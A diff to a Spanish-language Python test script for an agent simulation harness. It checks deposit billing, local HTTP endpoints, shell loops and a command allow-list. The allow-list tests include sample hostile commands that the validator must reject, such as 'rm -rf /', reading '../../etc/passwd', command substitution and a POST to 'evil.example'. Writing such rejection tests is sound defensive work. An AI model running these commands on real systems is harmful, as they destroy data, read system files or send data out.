@@ -33,7 +33,12 @@ spec.loader.exec_module(bucle)
 fallos: list[str] = []
 
 
+n_chk = 0
+
+
 def chk(nombre: str, ok: bool, detalle: str = "") -> None:
+    global n_chk
+    n_chk += 1
     print(f"  [{'OK ' if ok else 'MAL'}] {nombre}" + (f" — {detalle}" if detalle else ""))
     if not ok:
         fallos.append(nombre)
@@ -69,7 +74,7 @@ def main() -> None:
         try:
             cuerpo = urllib.request.urlopen(f"http://127.0.0.1:{ag['puerto']}/entrada",
                                             timeout=5).read().decode()
-            dado = json.loads(cuerpo).get("parametro")
+            dado = json.loads(cuerpo).get("parte_4")
         except Exception as ex:  # noqa: BLE001
             dado = f"sin respuesta ({ex})"
         chk(f"{nombre} (puerto {ag['puerto']}) recibe su parte {ag['parte']}",
@@ -88,7 +93,7 @@ def main() -> None:
         r = c.ejecutar("bash", {"comando":
                                 f"curl -s http://127.0.0.1:{ags[nombre]['puerto']}/entrada"})
         cuerpo = r.split("---")[0].strip()
-        m_par = bucle.re.search(r'"parametro":\s*"([^"]+)"', cuerpo)
+        m_par = bucle.re.search(r'"parte_4":\s*"([^"]+)"', cuerpo)
         got = m_par.group(1) if m_par else None
         try:
             json.loads(cuerpo)
@@ -224,12 +229,16 @@ def main() -> None:
                  "curl -s http://127.0.0.1:%d/entrada" % p1, "curl http://localhost:%d/" % p1,
                  "cat entorno.txt tarea.txt 2>&1 | head -100", "cat entorno.txt; echo ---; cat tarea.txt",
                  "cat parte1.txt parte2.txt parte3.txt 2>/dev/null", "head -50 entorno.txt",
-                 "ls -la", "pwd", "wc -l entorno.txt"]
+                 "ls -la", "pwd", "wc -l entorno.txt", "head -c 200 parte1.txt",
+                 "tail -n 5 entorno.txt", "wc -c *.txt", "ls -la && cat tarea.txt",
+                 "file parte1.txt", "od -c parte1.txt"]
     for cmd in legítimos:
         chk(f"admite: {cmd[:58]}", c7._permitido(cmd, p1))
+    # `cat x && ls` salio de aqui: `&&` es un separador y sus etapas ya se validan una a una. En su
+    # lugar entran `&` (segundo plano, si cambia la semantica) y el bucle con cuerpo prohibido.
     inyecciones = ["cat x | rm -rf /", "cat x; rm -rf /", "cat $(whoami)", "cat x > y",
                    "cat ../../etc/passwd", "curl http://localhost:9999/", "rm -rf /",
-                   "cat x && ls", "curl -X POST http://evil.example/", "cat x `id`"]
+                   "cat x & sleep 1", "curl -X POST http://evil.example/", "cat x `id`"]
     for cmd in inyecciones:
         chk(f"rechaza: {cmd[:56]}", not c7._permitido(cmd, p1))
 
@@ -321,6 +330,105 @@ def main() -> None:
         f"nuevos {n2}, saldo {c13.pasos[p_cheap]}")
     chk("wc -c ya no se rechaza", c7._permitido("wc -c parte1.txt", p1))
 
+    # ---- K. lo que ninguna revisión cazó: lo cazó correr, con dinero real ----
+    print("\nK. Doble cobro, empaquetado de la parte y fricción de la shell")
+    # K1: un depósito por HERRAMIENTA se cobra UNA vez. Antes se cobraba dos: una al depositar y
+    # otra al reconciliar la MISMA línea del servicio, porque el _post de la herramienta escribía en
+    # el log de mensajes y la reconciliación la leía como si fuera un depósito HTTP.
+    limpiar_almacen()
+    c_k1 = bucle.Corrida(escena, "/tmp/prueba_solvente_doble")
+    c_k1.ronda = 1
+    quien = max(autos, key=lambda n: ags[n]["precio_depositar"])   # el más caro: se ve antes
+    c_k1.actual = quien
+    c_k1.acciones_ronda[quien] = 0
+    precio_k = ags[quien]["precio_depositar"]
+    c_k1.ejecutar("depositar", {"texto": "mi clave de prueba"})
+    ruta_msg = os.path.join(BASE, f"puerto_mensajes_{ags[quien]['puerto']}.jsonl")
+    filas_msg = ([json.loads(l) for l in open(ruta_msg, encoding="utf-8") if l.strip()]
+                 if os.path.exists(ruta_msg) else [])
+    marcada = any(str(f.get("origen") or "") == "herramienta" for f in filas_msg)
+    reconciliados = c_k1.reconciliar_depositos_http()
+    chk("un depósito por herramienta se cobra UNA vez (la reconciliación no lo recobra)",
+        c_k1.gastado[quien] == precio_k and reconciliados == 0 and len(c_k1.depositos) == 1
+        and marcada,
+        f"gastado {c_k1.gastado[quien]} (precio {precio_k}), reconciliados {reconciliados}, "
+        f"entradas {len(c_k1.depositos)}, marca de origen {marcada}")
+    # K1b: y el camino HTTP directo sigue contando (que el arreglo no lo haya apagado)
+    limpiar_almacen()
+    c_k1b = bucle.Corrida(escena, "/tmp/prueba_solvente_doble2")
+    c_k1b.ronda = 1
+    publicar_http(ags[quien]["puerto"], "clave por la via del servicio")
+    n_k1b = c_k1b.reconciliar_depositos_http()
+    chk("un depósito por HTTP directo se cobra UNA vez (el arreglo no apagó esa vía)",
+        n_k1b == 1 and c_k1b.gastado[quien] == precio_k and len(c_k1b.depositos) == 1,
+        f"nuevos {n_k1b}, gastado {c_k1b.gastado[quien]}")
+    # K2: /entrada nombra la parte como la nombra la tarea, y primero
+    cuerpo_ent = urllib.request.urlopen(f"http://127.0.0.1:{ags[autos[0]]['puerto']}/entrada",
+                                        timeout=5).read().decode()
+    d_ent = json.loads(cuerpo_ent)
+    chk("el recurso nombra la parte 'parte_4' (la tarea pide 'la cuarta parte')",
+        d_ent.get("parte_4") == ags[autos[0]]["parte"] and "parametro" not in d_ent,
+        f"claves: {sorted(d_ent)}")
+    chk("la parte va antes que la vista del almacén (no enterrada)",
+        list(d_ent)[1] == "parte_4", f"orden: {list(d_ent)}")
+    chk("actividad_reciente acotada a 5 entradas",
+        len(d_ent.get("actividad_reciente") or []) <= 5,
+        f"{len(d_ent.get('actividad_reciente') or [])} entradas")
+    # K3: el bucle for y los comodines que los agentes escriben de verdad
+    c_k3 = bucle.Corrida(escena, "/tmp/prueba_solvente_bucle")
+    c_k3.ronda = 1
+    c_k3.actual = autos[0]
+    c_k3.acciones_ronda[autos[0]] = 0
+    wd3 = os.path.join(c_k3.salida, "work", autos[0])
+    os.makedirs(wd3, exist_ok=True)
+    for f3, t3 in (("parte1.txt", "A1\n"), ("parte2.txt", "B2\n"), ("parte3.txt", "C3\n")):
+        with open(os.path.join(wd3, f3), "w", encoding="utf-8") as fh:
+            fh.write(t3)
+    antes_k3 = c_k3.gastado[autos[0]]
+    sal_bucle = c_k3.ejecutar("bash", {"comando": "for a in *.txt; do cat $a; done"})
+    chk("un bucle for se acepta, lee los tres archivos y cuesta UN paso",
+        all(x in sal_bucle for x in ("A1", "B2", "C3"))
+        and c_k3.gastado[autos[0]] - antes_k3 == c.e["precio"]["comando"],
+        f"costo {c_k3.gastado[autos[0]] - antes_k3}, salida {sal_bucle[:50]!r}")
+    chk("wc -c *.txt (comodín) se acepta",
+        c_k3._permitido("wc -c *.txt", ags[autos[0]]["puerto"]))
+    chk("un comando inventado del cuerpo del bucle NO se cuela",
+        c_k3._bash_for(bucle.re.match(bucle.Corrida.FORMA_FOR,
+                                      "for a in *.txt; do rm -rf $a; done"), ags[autos[0]])
+        .startswith("parte1.txt: comando del cuerpo no permitido"))
+    # K3b: el bucle al FINAL de una lista de comandos (como lo escriben de verdad)
+    c_k3b = bucle.Corrida(escena, "/tmp/prueba_solvente_bucle2")
+    c_k3b.ronda = 1
+    c_k3b.actual = autos[0]
+    c_k3b.acciones_ronda[autos[0]] = 0
+    wd3b = os.path.join(c_k3b.salida, "work", autos[0])
+    os.makedirs(wd3b, exist_ok=True)
+    for f3, t3 in (("parte1.txt", "A1\n"), ("parte2.txt", "B2\n")):
+        with open(os.path.join(wd3b, f3), "w", encoding="utf-8") as fh:
+            fh.write(t3)
+    antes_k3b = c_k3b.gastado[autos[0]]
+    sal_bucle2 = c_k3b.ejecutar("bash", {"comando": "ls -la; for a in *.txt; do cat $a; done"})
+    chk("bucle al final de una lista: corre el prefijo, el bucle y cuesta UN paso",
+        ("A1" in sal_bucle2 and "B2" in sal_bucle2 and "parte1.txt" in sal_bucle2
+         and c_k3b.gastado[autos[0]] - antes_k3b == c.e["precio"]["comando"]),
+        f"costo {c_k3b.gastado[autos[0]] - antes_k3b}, salida {sal_bucle2[:60]!r}")
+    # K3c: un comando vacio no cuesta paso (es una confusión de forma, no una decisión)
+    c_k3c = bucle.Corrida(escena, "/tmp/prueba_solvente_vacio")
+    c_k3c.ronda = 1
+    c_k3c.actual = autos[0]
+    sal_vacio = c_k3c.ejecutar("bash", {"comando": ""})
+    chk("un comando vacio no gasta paso y explica la forma correcta",
+        c_k3c.gastado[autos[0]] == 0 and "comando" in sal_vacio,
+        f"gastado {c_k3c.gastado[autos[0]]}, respuesta {sal_vacio[:50]!r}")
+    # K4: el inventario existe y nombra cada archivo
+    c_k4 = bucle.Corrida(escena, "/tmp/prueba_solvente_inv")
+    c_k4.actual = autos[0]
+    wd4 = bucle._preparar_directorio(c_k4, autos[0])
+    inv = open(os.path.join(wd4, "inventario.txt"), encoding="utf-8").read()
+    chk("inventario.txt existe y nombra cada archivo del directorio",
+        all(f in inv for f in ("tarea.txt", "parte1.txt", "parte_propia.txt", "verificacion.txt")),
+        f"archivos: {sorted(os.listdir(wd4))}")
+
     # ---- J. atar la luz verde a los hashes: "las pruebas pasan" tiene que ser de ESTA escena ----
     import hashlib
     def _sha_archivo(p: str) -> str:
@@ -332,7 +440,7 @@ def main() -> None:
             ("bucle.py", "puerto.py", "validador.py", "agregar.py", "servicios.py")
         ).encode()).hexdigest()[:16],
         "hash_pruebas": _sha_archivo(os.path.abspath(__file__)),
-        "comprobaciones_ok": 50 - len(fallos) + (len(fallos) and 0) or None,
+        "comprobaciones_ok": n_chk - len(fallos) if not fallos else 0,
         "fallos": fallos,
         "ts": __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ", __import__("time").gmtime()),
     }
